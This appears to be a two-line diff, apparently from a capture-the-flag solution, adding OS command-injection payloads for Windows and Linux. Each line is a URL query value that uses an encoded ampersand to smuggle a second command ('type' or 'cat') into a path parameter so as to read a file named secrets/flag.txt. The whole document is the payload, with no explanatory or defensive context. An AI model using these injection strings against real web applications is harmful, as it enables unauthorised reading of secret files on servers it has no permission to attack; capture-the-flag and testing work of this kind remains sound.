@@ -1,0 +1,2 @@
+Windows: /?path=%26type%20secrets\flag.txt
+Linux: /path=%26cat%20secrets/flag.txt
